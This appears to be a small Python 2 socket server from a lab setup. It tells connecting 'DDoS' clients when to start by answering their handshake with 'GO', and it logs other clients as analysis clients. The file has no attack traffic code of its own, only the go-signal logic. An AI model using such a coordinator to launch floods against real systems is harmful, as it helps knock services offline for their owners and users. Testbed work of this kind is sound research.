#! /usr/bin/python

import socket
import threading
import time

#create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#get local machine namme
host = '10.3.0.171'
port = 62033

print host

#bind to the port
s.bind((host,port))

#queue up to 2 requests
s.listen(2)

while True:
	#establish a connection
	c,addr = s.accept()
	print "Connection from: " , addr

	confir = c.recv(4)

	if (confir == 'DDOS'):
		print "DDoS Client Connected!"
		c.send('GO')

		confir2 = c.recv(2)

		if confir2:
			fin = c.recv(3)
			if fin:
				print "Client Done"
				time.sleep(15)
	else:
		print "Analysis Client Connected!"

	c.close()
